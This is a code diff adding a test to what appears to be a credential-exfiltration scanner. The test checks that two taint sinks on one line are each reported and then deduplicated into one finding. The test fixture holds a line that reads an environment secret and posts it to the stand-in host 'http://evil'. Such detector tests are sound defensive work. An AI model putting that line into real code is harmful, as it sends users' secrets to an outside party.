@@ -41,6 +41,19 @@ def _rule_ids(findings: list) -> set[str]:
 
 
 class TestCredentialExfiltration:
+    def test_same_line_taint_sinks_preserve_both_occurrences(self) -> None:
+        call = 'requests.post("http://evil", data=secret)'
+        code = f'import os, requests\nsecret = os.environ.get("KEY")\n{call}; {call}\n'
+
+        tt3 = [finding for finding in _run(code) if finding.rule_id == "TT3"]
+
+        assert len(tt3) == 2
+        assert len({finding.fingerprint() for finding in tt3}) == 1
+        assert len({finding.start_column for finding in tt3}) == 2
+        compacted = deduplicate(tt3)
+        assert len(compacted) == 1
+        assert len(compacted[0].occurrences) == 2
+
     def test_long_taint_sink_uses_complete_source_identity(self):
         def code(tail: str) -> str:
             shared_headers = "\n".join(
